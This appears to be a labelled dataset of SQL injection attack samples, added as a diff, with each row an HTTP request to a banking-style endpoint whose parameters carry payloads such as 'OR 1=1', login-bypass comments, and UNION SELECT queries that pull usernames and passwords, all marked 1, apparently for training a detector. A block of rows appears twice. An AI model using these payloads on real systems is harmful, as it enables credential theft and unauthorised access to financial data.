+"POST /withdrawal HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=100' UNION SELECT null, username, password FROM users --&amount=200",1
+POST /deposit HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1002' AND 1=1 --&amount=500,1
+"POST /payment/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=1234' UNION SELECT null, username, password FROM users --&receiver_account=5678",1
+POST /user/signup HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=admin,1
+POST /account/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1' AND 1=1 --&action=delete,1
+"POST /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=1' UNION SELECT null, username, password FROM users --&status=completed",1
+POST /loan/details HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=3' OR '1'='1' --&action=update,1
+"POST /card/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncard_id=1' UNION SELECT null, username, password FROM users --&expiry_date=12/24",1
+"POST /user/transaction HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""transaction_id\"":\""100' OR 1=1 --\"",\""amount\"":200}",1
+"POST /deposit HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1000' UNION SELECT null, username, password FROM users --&amount=200",1
+"POST /loan/payment HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":5,\""amount\"":\""1000' OR 1=1 --\""}",1
+POST /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' AND 1=1 --&address=NYC,1
+POST /transaction/withdrawal HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1234' OR '1'='1' --&amount=100,1
+"POST /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=1234' UNION SELECT null, username, password FROM users --&receiver_account=5678",1
+"POST /account/statement HTTP/1.1\nContent-Type: application/json\n{\""account_number\"":1234,\""statement_date\"":\""2022-01-01' OR '1'='1' --\""}",1
+"POST /user/login HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' --\"",\""password\"":\""1234\""}",1
+POST /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=1' AND 1=1 --&amount=1000,1
+"PUT /account/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1001' UNION SELECT null, username, password FROM users --&balance=5000",1
+"PUT /user/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""email\"":\""admin' OR 1=1 --@domain.com\"",\""phone\"":\""1234567890\""}",1
+PUT /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=1' OR '1'='1' --&status=completed,1
+"PUT /loan/update HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":1,\""status\"":\""approved' OR 1=1 --\""}",1
+PUT /payment/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=1' AND 1=1 --&amount=2000,1
+PUT /user/settings HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' OR '1'='1' --&theme=dark,1
+PUT /transaction HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=1001' AND 1=1 --&amount=100,1
+"PUT /account HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1234' UNION SELECT null, username, password FROM users --&balance=2000",1
+"PUT /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=2' UNION SELECT null, username, password FROM users --&address=LA",1
+"PUT /loan/payment HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":10,\""amount\"":\""2000' OR 1=1 --\""}",1
+"PUT /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=1234' UNION SELECT null, username, password FROM users --&receiver_account=5678",1
+PUT /account/deposit HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1' AND 1=1 --&amount=500,1
+"PUT /user/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":2,\""email\"":\""user@domain.com' OR '1'='1' --\""}",1
+PUT /transaction/status HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=100' AND 1=1 --&status=completed,1
+"DELETE /account/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /transaction/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=1' OR '1'='1' --&action=delete,1
+"DELETE /user/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /loan/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=3' AND 1=1 --&action=delete,1
+"DELETE /payment/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=5' UNION SELECT null, username, password FROM users --&action=delete",1
+"DELETE /account HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=100' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /profile/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=2' AND '1'='1' --&action=delete,1
+"DELETE /transaction HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=100' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=1' OR '1'='1' --&action=delete,1
+"DELETE /loan HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransfer_id=10' AND 1=1 --&action=delete,1
+"DELETE /account/statement HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nstatement_id=2' UNION SELECT null, username, password FROM users --&action=delete",1
+"DELETE /customer/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncustomer_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
+"DELETE /transaction/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=15' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /account/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1' AND 1=1 --&action=delete,1
+DELETE /payment/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=4' OR 1=1 --&action=delete,1
+"PATCH /account/update HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""balance\"":\""5000' OR 1=1 --\""}",1
+"PATCH /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=10' UNION SELECT null, username, password FROM users --&status=approved",1
+PATCH /payment/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=2' AND 1=1 --&amount=200,1
+"PATCH /profile/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""phone\"":\""9876543210' UNION SELECT null, username, password FROM users --\""}",1
+"PATCH /loan/update HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":1,\""status\"":\""approved' OR 1=1 --\""}",1
+PATCH /transaction/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=100' AND 1=1 --&status=completed,1
+"PATCH /payment HTTP/1.1\nContent-Type: application/json\n{\""payment_id\"":1,\""status\"":\""completed' OR 1=1 --\""}",1
+PATCH /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransfer_id=1' AND 1=1 --&status=completed,1
+"PATCH /account/settings HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""theme\"":\""dark' OR 1=1 --\""}",1
+"PATCH /loan/payment HTTP/1.1\nContent-Type: application/json\n{\""loan_id\"":2,\""amount\"":\""200' OR 1=1 --\""}",1
+"PATCH /transaction/status HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=500' UNION SELECT null, username, password FROM users --&status=completed",1
+"PATCH /user/settings HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""language\"":\""en' OR 1=1 --\""}",1
+GET /account/details?account_number=12345' OR '1'='1' -- HTTP/1.1,1
+"GET /transfer/history?user_id=1001' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /transactions?account_id=2' AND '1'='1' -- HTTP/1.1,1
+GET /balance?user_id=1234' AND '1'='1' -- HTTP/1.1,1
+GET /login?username=admin' OR 1=1 -- HTTP/1.1,1
+GET /user/transactions?user_id=1' AND 1=1 -- HTTP/1.1,1
+"GET /user/loan?loan_id=7' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /funds/transfer?sender_account=1234' OR '1'='1' -- HTTP/1.1,1
+GET /account/overview?account_number=9876' AND '1'='1' -- HTTP/1.1,1
+GET /user/profile?user_id=1' OR '1'='1' -- HTTP/1.1,1
+GET /search?query=loan' HAVING 1=1 -- HTTP/1.1,1
+"GET /transactions/history?account_id=789' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /user/details?user_id=3' OR '1'='1' -- HTTP/1.1,1
+"GET /account/statement?account_number=2345' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /profile?user_id=10' AND '1'='1' -- HTTP/1.1,1
+GET /search?keyword=balance' HAVING 1=1 -- HTTP/1.1,1
+GET /payment/details?payment_id=8' OR '1'='1' -- HTTP/1.1,1
+GET /account/transactions?account_number=456' OR '1'='1' -- HTTP/1.1,1
+GET /loan/repayment?loan_id=4' OR '1'='1' -- HTTP/1.1,1
+"GET /payments?payment_id=5' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /card/details?card_id=1111' OR '1'='1' -- HTTP/1.1,1
+GET /customer/details?customer_id=7' OR '1'='1' -- HTTP/1.1,1
+"GET /user/loan/status?loan_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /transfer?user_id=2' AND '1'='1' -- HTTP/1.1,1
+"GET /transaction/status?transaction_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /account/history?account_number=333' OR '1'='1' -- HTTP/1.1,1
+POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&password=admin,1
+"POST /transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' UNION SELECT null, username, password FROM users --&amount=500",1
+"POST /payment HTTP/1.1\nContent-Type: application/json\n{\""payment_id\"":5,\""amount\"":\""1000' OR '1'='1' --\""}",1
+"POST /loan/request HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=2' UNION SELECT null, username, password FROM users --&amount=2000",1
+POST /account/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1001' AND 1=1 --&balance=5000,1
+POST /user/signup HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=new_user' OR '1'='1' --&password=secret,1
+POST /transaction/create HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1000' AND 1=1 --&amount=1000,1
+"POST /loan/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=3' UNION SELECT null, username, password FROM users --&status=approved",1
+"POST /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=2' UNION SELECT null, username, password FROM users --&email=user@domain.com",1
+POST /withdrawal HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1234' AND 1=1 --&amount=500,1
+POST /account/create HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=new_user' OR '1'='1' --&password=admin123,1
+"POST /deposit HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=100' UNION SELECT null, username, password FROM users --&amount=200",1
+"POST /transfer/verify HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=100' UNION SELECT null, username, password FROM users --&receiver_account=500&amount=200",1
+POST /payment/transaction HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=5' AND '1'='1' --&amount=1500,1
+"POST /account/statement HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1000' UNION SELECT null, username, password FROM users --&date_range=2022-01-01",1
+"POST /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsender_account=1234' UNION SELECT null, username, password FROM users --&receiver_account=5678&amount=1000",1
+"POST /user/login HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' --\"",\""password\"":\""password\""}",1
+"POST /loan/approve HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=1' UNION SELECT null, username, password FROM users --&status=approved",1
+"POST /transaction/withdrawal HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1000' UNION SELECT null, username, password FROM users --&amount=500",1
+"POST /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=5' UNION SELECT null, username, password FROM users --&status=completed",1
+POST /payment/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=3' AND 1=1 --&status=approved,1
+"PUT /account/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_id=1001' UNION SELECT null, username, password FROM users --&balance=1000",1
+PUT /loan/approve HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=2' AND '1'='1' --&status=approved,1
+"PUT /user/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=3' UNION SELECT null, username, password FROM users --&phone=1234567890",1
+PUT /payment/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=8' AND 1=1 --&amount=1000,1
+"PUT /transaction/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=7' UNION SELECT null, username, password FROM users --&status=completed",1
+"PUT /card/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncard_id=11' UNION SELECT null, username, password FROM users --&expiry_date=12/24",1
+PUT /transaction HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=100' AND '1'='1' --&status=completed,1
+"PUT /user/settings HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""language\"":\""en' OR 1=1 --\""}",1
+"PUT /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=5' UNION SELECT null, username, password FROM users --&status=completed",1
+PUT /transaction/status HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=50' AND '1'='1' --&status=completed,1
+"PUT /loan/payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=3' UNION SELECT null, username, password FROM users --&amount=5000",1
+PUT /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransfer_id=10' AND 1=1 --&status=completed,1
+"PUT /account/settings HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""theme\"":\""dark' OR 1=1 --\""}",1
+"DELETE /account/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /transaction/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=5' OR '1'='1' --&action=delete,1
+"DELETE /user/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=3' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /payment/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=8' AND 1=1 --&action=delete,1
+"DELETE /loan/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nloan_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /card/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncard_id=100' AND 1=1 --&action=delete,1
+"DELETE /account HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=2000' UNION SELECT null, username, password FROM users --&action=delete",1
+"DELETE /payment/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_id=1' UNION SELECT null, username, password FROM users --&action=delete",1
+"DELETE /transaction/clear HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransaction_id=2' UNION SELECT null, username, password FROM users --&action=delete",1
+DELETE /user/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=10' AND 1=1 --&action=delete,1
+"DELETE /funds/transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntransfer_id=1' UNION SELECT null, username, password FROM users --&",1
+GET /bank/loan/status?loan_number=999' OR 1=1 -- HTTP/1.1,1
+"GET /customer/account?account_id=7890' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /balance/summary?customer_id=2345' AND '1'='1' -- HTTP/1.1,1
+"GET /account/overview?account_number=1234' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /withdrawal/details?transaction_id=4567' AND '1'='1' -- HTTP/1.1,1
+GET /transfer/funds?from_account=10001' OR '1'='1' -- HTTP/1.1,1
+GET /payment/status?payment_reference=abc123' AND '1'='1' -- HTTP/1.1,1
+"GET /transactions/history?account_id=2222' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /user/transactions?user_id=11' OR '1'='1' -- HTTP/1.1,1
+GET /customer/info?customer_id=567' AND '1'='1' -- HTTP/1.1,1
+"GET /loan/repayment?loan_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /funds/transfer?from_account=12121' OR '1'='1' -- HTTP/1.1,1
+GET /transaction/details?transaction_id=9' AND '1'='1' -- HTTP/1.1,1
+"GET /user/loan/status?user_id=18' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /payment/details?payment_id=44' AND '1'='1' -- HTTP/1.1,1
+GET /user/update/details?user_id=300' OR '1'='1' -- HTTP/1.1,1
+"GET /card/status?card_number=8765' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /account/funds?account_id=4' AND '1'='1' -- HTTP/1.1,1
+"GET /customer/transactions?customer_id=556' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /payment/verify?payment_id=20' AND '1'='1' -- HTTP/1.1,1
+GET /withdrawal/confirmation?transaction_id=15' OR '1'='1' -- HTTP/1.1,1
+"GET /loan/lookup?loan_id=7' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /funds/transfer/verify?transfer_id=900' AND '1'='1' -- HTTP/1.1,1
+"GET /user/details?user_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /card/lookup?card_id=890' AND '1'='1' -- HTTP/1.1,1
+"GET /account/transactions?account_number=1005' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /payment/update?payment_id=72' AND '1'='1' -- HTTP/1.1,1
+"GET /loan/applications?loan_type=personal' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /account/funds/status?account_id=3000' OR '1'='1' -- HTTP/1.1,1
+GET /bank/loan/status?loan_number=999' OR 1=1 -- HTTP/1.1,1
+"GET /customer/account?account_id=7890' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /balance/summary?customer_id=2345' AND '1'='1' -- HTTP/1.1,1
+"GET /account/overview?account_number=1234' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /withdrawal/details?transaction_id=4567' AND '1'='1' -- HTTP/1.1,1
+GET /transfer/funds?from_account=10001' OR '1'='1' -- HTTP/1.1,1
+GET /payment/status?payment_reference=abc123' AND '1'='1' -- HTTP/1.1,1
+"GET /transactions/history?account_id=2222' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /user/transactions?user_id=11' OR '1'='1' -- HTTP/1.1,1
+GET /customer/info?customer_id=567' AND '1'='1' -- HTTP/1.1,1
+"GET /loan/repayment?loan_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /funds/transfer?from_account=12121' OR '1'='1' -- HTTP/1.1,1
+GET /transaction/details?transaction_id=9' AND '1'='1' -- HTTP/1.1,1
+"GET /user/loan/status?user_id=18' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /payment/details?payment_id=44' AND '1'='1' -- HTTP/1.1,1
+GET /user/update/details?user_id=300' OR '1'='1' -- HTTP/1.1,1
+"GET /card/status?card_number=8765' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /account/funds?account_id=4' AND '1'='1' -- HTTP/1.1,1
+"GET /customer/transactions?customer_id=556' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /payment/verify?payment_id=20' AND '1'='1' -- HTTP/1.1,1
+GET /withdrawal/confirmation?transaction_id=15' OR '1'='1' -- HTTP/1.1,1
+"GET /loan/lookup?loan_id=7' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /funds/transfer/verify?transfer_id=900' AND '1'='1' -- HTTP/1.1,1
+"GET /user/details?user_id=12' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /card/lookup?card_id=890' AND '1'='1' -- HTTP/1.1,1
+"GET /account/transactions?account_number=1005' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /payment/update?payment_id=72' AND '1'='1' -- HTTP/1.1,1
+"GET /loan/applications?loan_type=personal' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /account/funds/status?account_id=3000' OR '1'='1' -- HTTP/1.1,1
+"PUT /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=112233' UNION SELECT null, username, password FROM users --&balance=5000",1
+PUT /loan/update HTTP/1.1\nContent-Type: application/json\nloan_id=4455' AND '1'='1' --&status=approved,1
+PUT /user/settings HTTP/1.1\nContent-Type: application/json\nuser_id=7890' OR '1'='1' --&notification=true,1
+"PUT /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=7890' UNION SELECT null, username, password FROM users --&status=completed",1
+PUT /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=12345' AND '1'='1' --&amount=1500,1
+"PUT /account/modify HTTP/1.1\nContent-Type: application/json\naccount_id=11111' UNION SELECT null, username, password FROM users --&account_type=savings",1
+PUT /user/profile HTTP/1.1\nContent-Type: application/json\nuser_id=1234' OR '1'='1' --&name=NewUserName,1
+"PUT /loan/modify HTTP/1.1\nContent-Type: application/json\nloan_id=500' UNION SELECT null, username, password FROM users --&amount=15000",1
+PUT /funds/update HTTP/1.1\nContent-Type: application/json\naccount_id=2233' AND '1'='1' --&funds=2000,1
+"PUT /card/modify HTTP/1.1\nContent-Type: application/json\ncard_id=9012' UNION SELECT null, username, password FROM users --&expiry_date=12/25",1
+PUT /payment/modify HTTP/1.1\nContent-Type: application/json\npayment_id=3546' AND '1'='1' --&status=cancelled,1
+PUT /transaction/status HTTP/1.1\nContent-Type: application/json\ntransaction_id=1234' OR '1'='1' --&status=failed,1
+"PUT /customer/update HTTP/1.1\nContent-Type: application/json\ncustomer_id=4567' UNION SELECT null, username, password FROM users --&address=NewStreet",1
+PUT /user/modify HTTP/1.1\nContent-Type: application/json\nuser_id=8910' AND '1'='1' --&password=newpass,1
+"PUT /loan/request HTTP/1.1\nContent-Type: application/json\nloan_id=768' UNION SELECT null, username, password FROM users --&amount=5000",1
+DELETE /account/remove HTTP/1.1\nContent-Type: application/json\naccount_id=1002' OR '1'='1' --&confirm=true,1
+"DELETE /loan/cancel HTTP/1.1\nContent-Type: application/json\nloan_id=345' UNION SELECT null, username, password FROM users --&reason=change_of_plan",1
+DELETE /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=456' AND '1'='1' --&reason=error,1
+"DELETE /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_id=999' UNION SELECT null, username, password FROM users --&reason=duplicate",1
+DELETE /card/delete HTTP/1.1\nContent-Type: application/json\ncard_id=1111' AND '1'='1' --&reason=lost,1
+"DELETE /user/remove HTTP/1.1\nContent-Type: application/json\nuser_id=2222' UNION SELECT null, username, password FROM users --&confirm=true",1
+DELETE /funds/remove HTTP/1.1\nContent-Type: application/json\nfund_id=555' OR '1'='1' --&reason=overwithdrawal,1
+"DELETE /account/close HTTP/1.1\nContent-Type: application/json\naccount_id=1005' UNION SELECT null, username, password FROM users --&reason=inactive",1
+DELETE /payment/remove HTTP/1.1\nContent-Type: application/json\npayment_id=3333' AND '1'='1' --&reason=fraud,1
+"DELETE /loan/terminate HTTP/1.1\nContent-Type: application/json\nloan_id=6666' UNION SELECT null, username, password FROM users --&reason=paid_off",1
+DELETE /transaction/delete HTTP/1.1\nContent-Type: application/json\ntransaction_id=777' AND '1'='1' --&reason=duplicate,1
+"DELETE /user/deactivate HTTP/1.1\nContent-Type: application/json\nuser_id=888' UNION SELECT null, username, password FROM users --&confirm=true",1
+DELETE /payment/delete HTTP/1.1\nContent-Type: application/json\npayment_id=112' AND '1'='1' --&reason=error,1
+"DELETE /card/remove HTTP/1.1\nContent-Type: application/json\ncard_id=900' UNION SELECT null, username, password FROM users --&reason=theft",1
+DELETE /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=1010' OR '1'='1' --&reason=wrong_amount,1
+"DELETE /transaction/revert HTTP/1.1\nContent-Type: application/json\ntransaction_id=9999' UNION SELECT null, username, password FROM users --&reason=system_error",1
+GET /account/balance?account_id=12345' OR 1=1 -- HTTP/1.1,1
+"GET /user/details?user_id=1001' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /transactions/history?account_id=54321' AND '1'='1' -- HTTP/1.1,1
+GET /login?username=admin' OR '1'='1' -- HTTP/1.1,1
+"GET /account/overview?account_number=99999' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /payment/history?payment_id=456' AND '1'='1' -- HTTP/1.1,1
+GET /transfer/history?from_account=2345' OR '1'='1' -- HTTP/1.1,1
+GET /user/profile?user_id=5432' AND '1'='1' -- HTTP/1.1,1
+"GET /account/statement?account_id=67890' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /loan/details?loan_id=321' AND '1'='1' -- HTTP/1.1,1
+GET /search/loan?amount=5000' OR '1'='1' -- HTTP/1.1,1
+"GET /customer/lookup?customer_id=200' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /transaction/status?transaction_id=6000' AND '1'='1' -- HTTP/1.1,1
+"GET /user/transactions?user_id=400' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /account/transactions?account_number=11111' AND '1'='1' -- HTTP/1.1,1
+"GET /loan/status?loan_id=1234' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /funds/transfer?account_id=2222' AND '1'='1' -- HTTP/1.1,1
+"GET /card/details?card_number=5555' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /payment/status?payment_ref=abcdef' AND '1'='1' -- HTTP/1.1,1
+"GET /account/deposit?account_id=3000' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' OR '1'='1' --&password=pass123,1
+"POST /account/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=12345' UNION SELECT null, username, password FROM users --&to_account=67890&amount=1000",1
+POST /loan/apply HTTP/1.1\nContent-Type: application/json\nloan_id=56789' AND '1'='1' --&amount=15000&term=12,1
+"POST /user/register HTTP/1.1\nContent-Type: application/json\nemail=admin@example.com' UNION SELECT null, username, password FROM users --&password=newpass",1
+POST /transaction/initiate HTTP/1.1\nContent-Type: application/json\nfrom_account=1001' OR '1'='1' --&to_account=1002&amount=500,1
+"POST /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_ref=xyz789' UNION SELECT null, username, password FROM users --&amount=1000",1
+POST /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=98765' AND '1'='1' --&balance=5000,1
+POST /funds/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=11111' OR '1'='1' --&to_account=22222&amount=2000,1
+"POST /transaction/status HTTP/1.1\nContent-Type: application/json\ntransaction_id=7777' UNION SELECT null, username, password FROM users --&status=completed",1
+POST /loan/approve HTTP/1.1\nContent-Type: application/json\nloan_id=321' AND '1'='1' --&approved=true,1
+"POST /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_ref=12345' UNION SELECT null, username, password FROM users --&reason=error",1
+POST /user/profile HTTP/1.1\nContent-Type: application/json\nuser_id=54321' AND '1'='1' --&notification=true,1
+"POST /account/close HTTP/1.1\nContent-Type: application/json\naccount_id=9999' UNION SELECT null, username, password FROM users --&confirm=true",1
+POST /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=1001' AND '1'='1' --&status=completed,1
+"POST /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=222' UNION SELECT null, username, password FROM users --&status=failed",1
+POST /user/modify HTTP/1.1\nContent-Type: application/json\nuser_id=333' AND '1'='1' --&password=updatedpassword,1
+"POST /loan/status HTTP/1.1\nContent-Type: application/json\nloan_id=555' UNION SELECT null, username, password FROM users --&status=approved",1
+POST /card/modify HTTP/1.1\nContent-Type: application/json\ncard_id=444' AND '1'='1' --&expiry_date=12/23,1
+"POST /account/deposit HTTP/1.1\nContent-Type: application/json\naccount_id=2222' UNION SELECT null, username, password FROM users --&amount=1000",1
+POST /transaction/verify HTTP/1.1\nContent-Type: application/json\ntransaction_id=1111' AND '1'='1' --&verify=true,1
+"PUT /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=7777' UNION SELECT null, username, password FROM users --&balance=10000",1
+PUT /user/settings HTTP/1.1\nContent-Type: application/json\nuser_id=65432' AND '1'='1' --&notification=false,1
+"PUT /loan/update HTTP/1.1\nContent-Type: application/json\nloan_id=666' UNION SELECT null, username, password FROM users --&amount=20000",1
+PUT /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=3333' AND '1'='1' --&status=pending,1
